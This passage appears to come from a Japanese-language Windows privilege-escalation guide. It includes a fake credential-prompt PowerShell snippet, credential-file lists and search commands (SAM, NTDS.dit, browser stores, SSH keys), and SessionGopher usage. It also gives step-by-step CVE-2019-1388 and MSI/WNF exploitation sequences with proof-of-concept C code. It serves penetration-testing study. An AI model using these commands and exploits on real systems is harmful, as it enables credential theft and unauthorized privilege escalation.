$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことがある既知のファイル‌

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safeの拡張子を除いたファイル名リスト版

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 データベースでは、一般に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取り、ロック解除、保存された認証情報の使用が可能だとは限りません。こうしたファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` ファイルも、暗号化された vault の手掛かりにすぎません。ロック解除には、実際の master-password と、設定されている key-file やアカウント要素が必要です。許可を得た調査でエントリ内に LM:NT hash ペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT hash が現在も有効で、対象の NTLM サービスに受け入れられるかを確認してください。vault のエントリだけで Administrator または SYSTEM 権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、別途必要となるサービス実行手順もすべて満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報を出力しないでください。

提案されているファイルをすべて検索してください:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe 拡張機能を使用しない検索コマンド版

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin 内の認証情報

認証情報を探すため、ごみ箱も確認してください。

アクセス可能な Recycle Bin の項目を確認し、削除されたバックアップや構成アーカイブに加え、ファイル名に認証情報が明記されているファイルも探してください。有用な `.7z`、`.zip`、`.rar` バックアップは、数か月前のもので、一般的なファイル名が付いている場合もあります。Windows は元のパスと削除時刻を `$I` レコードに、削除されたファイルを対応する `$R` エントリに保存します。アーカイブを開く前に、メタデータと現在の ID による読み取り権限を確認してください。項目が見えるかどうかは、ボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップがないとは限りません。アーカイブ名は確認候補として扱い、有効な秘密情報が含まれている証拠とは見なさないでください。

アクセス可能な削除済み `.pfx` は、**code-signing** の手掛かりにもなります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell では秘密鍵を含む code-signing 証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の publisher ルールは署名者の ID とルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別アカウントで実行するには、現在の ID が対象のスクリプトそのものを変更できること、実効ルールがそのスクリプトと対象アカウントに対する変更後の署名を許可すること、さらにスケジュールされたタスクなど、より高い権限で実行される仕組みが実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、この一連の条件が成立する証拠にはなりません。秘密鍵のデータを開いたりタスクを起動したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手掛かりを探してください。BitLocker 回復情報のエクスポートは HTML や TXT として保存されていることがあり、名前の付いたバックアップアーカイブに含まれている場合もあります。このようなデータから、古いバックアップを含む別の暗号化データボリュームにアクセスできることがあります。アクセスが許可されている場合に限り、ボリュームとアーカイブを調査してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているように、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、使用可能な回復キーやドメインバックアップがあるとは判断できません。

複数のプログラムに保存された**パスワードを復元**するには、次を利用できます：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリからOpenSSHキーを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**ChromeまたはFirefox**のパスワードが保存されているデータベースを確認してください。\
**Chrome、Edge、またはFirefox**のパスワードが保存されているデータベースを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが保存されている**可能性があります。

現在のユーザーの標準的なEdge **Default**プロファイルでは、`Login Data`は`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`にあり、`Local State`は親ディレクトリの`User Data`にあります。[Microsoftは既定のプロファイルの場所を文書化しています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや`UserDataDir`ポリシーによって場所が変更されることがあります。ファイルが存在することは、認証情報を調査する手掛かりにすぎません。読み取り可能なファイルか、該当ユーザーのDPAPIコンテキストまたはその他の許可されたキー素材が利用できるか、保存されたログインがより高い権限を持つアカウントのものかを確認してください。パスのみを列挙する場合、データベースを開いたり、復号したパスワードを出力したりする必要はありません。

Firefoxについて、[Mozillaの説明](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の`key4.db`と`logins.json`は、対になる鍵ファイルと暗号化されたログイン情報のファイルです。これらのファイルが存在することは手掛かりにすぎません。両方のファイルが読み取り可能か、保存されたエントリーがあるか、資格情報が使用可能と判断する前にPrimary Passwordで鍵が保護されているかを確認してください。復元した資格情報がドメインアカウントのものなら、そのアカウントの実効的なグループ制御権限と、グループの[LAPSパスワード読み取りまたは復号権限](../active-directory-methodology/laps.md)を別々に確認してください。ブラウザーのアーティファクトだけでは、管理者権限への経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**はWindowsオペレーティングシステムに組み込まれた技術で、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にします。各COMコンポーネントは**クラスID (CLSID)によって識別**され、各コンポーネントは1つ以上のインターフェースを通じて機能を公開します。インターフェースはインターフェースID (IID)によって識別されます。

COMクラスとインターフェースは、それぞれレジストリの**HKEY\CLASSES\ROOT\CLSID**と**HKEY\CLASSES\ROOT\Interface**に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes**をマージして作成されます（= **HKEY\CLASSES\ROOT**）。

このレジストリのCLSID内には、子レジストリの**InProcServer32**があります。そこには**DLL**を指す**既定値**と、**Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチスレッド）、**Neutral**（スレッド中立）のいずれかを指定する**ThreadingModel**という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリのCLSID内には子レジストリのInProcServer32があり、DLLを指す既定値と値...が含まれています](<../../images/image (729).png>)

基本的に、実行されるDLLを**上書き**できれば、そのDLLが別のユーザーによって実行される場合に**権限昇格**できる可能性があります。

攻撃者が永続化の仕組みとしてCOM Hijackingをどのように利用するかについては、こちらを確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索する**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名を持つファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) は、被害者のシステム内で認証情報を検索するすべての Metasploit POST module を**自動的に実行する**ために作成した msf plugin です。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するもうひとつの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

SYSTEM として実行中の**プロセスが、フルアクセスで新しいプロセス**（`OpenProcess()`）を開くとします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限の新しいプロセス**（`CreateProcess()`）も**作成します**。\
その後、**低い権限のプロセスにフルアクセスできる**場合、`OpenProcess()` で作成された特権プロセスへの**オープンハンドルを取得し、shellcode を inject できます**。\
[この脆弱性を**検出して悪用する方法**について、詳しくはこの例を参照してください。](leaked-handle-exploitation.md)\
[プロセスやスレッドが異なる権限レベル（フルアクセスに限らない）で継承した、より多くのオープンハンドルをテストして悪用する方法について、より詳しく説明した**こちらの記事**も参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**パイプ**と呼ばれる共有メモリセグメントを使うと、プロセス間で通信やデータ転送ができます。

Windows には **Named Pipes** という機能があり、異なるネットワーク上にある場合も含め、無関係なプロセス間でデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、各プロセスは**名前付きパイプサーバー**または**名前付きパイプクライアント**として動作します。

**クライアント**がパイプ経由でデータを送信すると、パイプを設定した**サーバー**は、必要な **SeImpersonate** 権限があれば、**クライアントの ID を引き継ぐ**ことができます。模倣可能なパイプを介して通信する**特権プロセス**を特定できれば、自分が設定したパイプにそのプロセスが接続したときに ID を引き継ぎ、**より高い権限を取得する**機会になります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)にあるガイドが参考になります。

また、次のツールを使うと、burp のようなツールで名前付きパイプの通信を**傍受できます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。また、次のツールを使うと、すべてのパイプを一覧表示して確認し、privescs を探せます。 [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

サーバーモードの Telephony サービス（TapiSrv）は、`\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント経路を悪用し、`ClientAttach` を使って `NETWORK SERVICE` が書き込み可能な既存ファイルの任意の位置に**4バイトを書き込み**、その後 Telephony の管理者権限を取得して、任意の DLL をサービスとして読み込ませることができます。全体の流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを指定して `ClientAttach` を実行すると、サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込み先として使用します。
- 各イベントは、`Initialize` の攻撃者が制御する `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）を実行してから、`GetAsyncEvents`（`Req_Func 0`）で取得します。その後、登録解除またはシャットダウンを行うことで、決定論的な書き込みを繰り返せます。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行可能なファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown レンダラー経由の Protocol handler / ShellExecute abuse

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの任意のスキーム）を呼び出し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを探すためのコマンドライン監視**

ユーザーとして shell を取得した際、**コマンドラインに認証情報を渡している**スケジュールされたタスクやその他のプロセスが実行されている場合があります。以下のスクリプトは、2 秒ごとにプロセスのコマンドラインを取得し、現在の状態を前回の状態と比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ（CVE-2019-1388）/ UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや「NT\AUTHORITY SYSTEM」などの別のプロセスを実行できます。

このため、同じ脆弱性を利用して権限昇格と UAC Bypass を同時に実行できます。さらに、何もインストールする必要はなく、このプロセスで使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの一部を以下に示します。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、以下の手順を実行する必要があります:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

次の GitHub リポジトリに、必要なファイルと情報がすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level へ / UAC Bypass

**Integrity Levels について学ぶには、こちらを読んでください**:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶには、こちらを読んでください**:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root への Upload Directory Junctions

アプリケーションが予測可能な upload subdirectory を作成し、呼び出し元が指定したファイル名でその中にファイルを書き込み、その後ファイルを処理することがあります。低権限ユーザーがサーバー側での書き込み前にその subdirectory を削除し、NTFS junction に置き換えられる場合、書き込み先は junction をたどって web-served directory に移る可能性があります。サーバーがそのファイル形式を実行するなら、そこに置かれたスクリプトは web-service identity で実行される可能性があります。これはアプリケーション固有の arbitrary-write 境界です。書き込み可能な upload directory や既存の junction があるだけでは、脆弱性の証明にはなりません。

upload handler での正確なパス構築と処理のタイミング、ユーザーが subdirectory に対して持つ実効的な削除・作成権限、保存先の実効 ACL、書き込み処理が reparse point をたどるかどうか、web server がその保存先でファイルを実行するかどうかを確認してください。書き込み処理と web server のプロセス ID は、それぞれ個別に確認してください。受動的な調査では directory ACL と reparse metadata を確認できますが、handler の動作や将来の junction の差し替えまでは確認できません。実行が service account で行われる場合、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を調べてください。

## WNF によってトリガーされる、特権付き scheduled task のクリーンアップ

手動実行を拒否する scheduled task でも、権限のないユーザーが利用できるトリガーが存在する場合があります。特権付きタスクを監査する際は、その XML をエクスポートし、task DACL、principal、action に加えて、**すべての**トリガーを確認してください。特に、`WnfStateChangeTrigger` は Windows Notification Facility (WNF) の state を指定します。この保護可能な state で現在のユーザーによる更新の公開が許可されている場合、`<AllowStartOnDemand>false</AllowStartOnDemand>` であっても、ユーザーは設定された identity でタスクを間接的に開始できます。<sup>[[43]](#references)</sup>

たとえば Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` タスクは SYSTEM として実行され、標準ユーザーからの WNF state `7508BCA32C079E41` への更新を受け付け、Recall が無効な場合でも `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を調べていました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8 バイトの状態名に対して空の更新を送信して、戻りステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。次の簡略化したプローブでは、Recall タスクの例のバイト列を使用しています。テスト対象のタスク用にエクスポートしたバイトに置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを特権削除に利用する

重要なプリミティブはトリガー単独ではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更まで処理を追跡してください。プロファイル／セッションの検出、ワイルドカードで選択される子要素、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前に確認されたパス名が後で再帰的にたどられることを示す強い兆候です。子孫が信頼できるディレクトリハンドルを基準に開かれ、削除前に検証されない場合、攻撃者は列挙から使用までの間にパス解決先を変更できます。<sup>[[43]](#references)</sup>

WNF triggerを、後述する[oplock、junction、Object Manager symlinkによる置き換え](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplockで、正規の子要素を選択した後にcleanerを一時停止させ、その間に書き込み可能な祖先を置き換えます。すると、再開後の特権削除は`\RPC Control`を経由して保護対象を解決します。Recallの攻撃チェーンでは、これにより、文書化されているMSI rollback techniqueに必要な`C:\Config.Msi`をSYSTEM権限で削除できました。<sup>[[31]](#references)[[43]](#references)</sup>

### 入れ子の子孫は浅いreparse point対策を回避する

攻撃者が制御するルートとその直下の子要素だけを検証しても、再帰的なパス名ベースの削除を安全にはできません。検証済みのオブジェクトは正規のままにし、junction/oplockによる置き換えをさらに下の子要素に移します。`IFileOperation::DeleteItem`は、やがて未検証の子孫に到達し、新しいターゲットをたどります。CVE-2026-20941は、最初のRecallのパッチが`UKP`とGUID形式のディレクトリを検証しながら、従来の再帰削除処理を残したことで、まさにこの種の修正不備から発生しました。<sup>[[43]](#references)</sup>

安全な方法は、**すべての子孫**を、すでに信頼されているディレクトリハンドルを基準に開き、最終的に解決されたパス／オブジェクトを取得して検証し、その検証済みハンドルに対して削除 disposition を適用することです。プレフィックスを検証した後、再帰的なパス名ベースの削除に戻ってはいけません。パッチレビューでは、実際の呼び出し箇所における構造体も確認してください。このケースでは、`NtCreateFile`における`OBJECT_ATTRIBUTES`を実行時に調べると、`RootDirectory`が非NULLで、相対名が`{GUID}\\secure_file.lock`であることが分かりました。これにより、2つ目の`FILE_DELETE_ON_CLOSE`プリミティブがあるかのように見せる、誤解を招く逆コンパイラーの出力が否定されました。<sup>[[43]](#references)</sup>

## 任意のフォルダーの削除／移動／名前変更からSYSTEM EoPへ

この手法は[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で解説されており、exploit codeは[**こちらから入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installerのrollback featureを悪用し、アンインストール処理中に正規のファイルを悪意あるファイルに置き換えます。そのため、攻撃者は`C:\Config.Msi`フォルダーを乗っ取るための**悪意あるMSI installer**を作成する必要があります。このフォルダーは後でWindows Installerが他のMSI packageのアンインストール中にrollback filesを保存するために使用します。そのrollback filesを変更して、悪意あるpayloadを含ませます。

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

低権限のクライアントは、`CMsiConfigurationManager` COM object（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）を介してSYSTEM権限の`msiexec.exe` serviceにアクセスできます。リバースエンジニアリングにより、関連する`IMsiServer`呼び出しは、vtable offset `0xA0`の`MsiBeginTransactionW`、`0xC8`の`SetEEUIDirectoryAndFilter`、`0x50`の`CleanupTempPackages`と特定されました。これらの名前とoffsetはリバースエンジニアリングによるもので、buildによって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter`は、指定されたパスを`DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT`を指定して開く間だけ、呼び出し元を偽装します。これにより、呼び出し元がディレクトリを削除できることを確認し、reparse pointをたどらないようにします。しかし、確認したファイルオブジェクトを後のcleanup処理に結び付けるものではなく、そのオブジェクトがWindows Installerによって作成されたことを証明するものでもありません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW`の後、`SetEEUIDirectoryAndFilter`は、呼び出し元のfilter引数に関係なく、そのパスをフォルダーとして登録します。serviceは、`HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`の下に名前付き`REG_DWORD`値を書き込みます。値の名前は呼び出し元が制御するパスで、データ`0x00000002`はフォルダーフラグです。その後、`CleanupTempPackages(NULL, FALSE)`がcleanupを直接開始します。昇格されたworkerはレジストリ値を列挙し、フォルダー項目をパスの出所を確認せずに再帰的な`FDeleteFolder`へ渡します。通常の削除に失敗すると、コードは`LockdownPath`も呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll`から特定された最小限の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用な primitive は junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名を保護された rollback データで再作成させます。Cleanup は古い `TempPackages` 名を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は必要ないため、`FILE_FLAG_OPEN_REPARSE_POINT` とリダイレクト信頼性の緩和策による想定上の境界を回避できます。<sup>[[41]](#references)</sup>

この削除 primitive は、以下の rollback chain に利用できます。別個の `Installer\Folders` レコードを保持し、保護された `C:\Config.Msi` を削除して NULL DACL で再作成し、Installer が DACL を強化する前に `WRITE_DAC` が許可された handle を保持します。事前に開いた handle から `NtSetSecurityObject` で許可的な DACL を復元でき、その後 rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

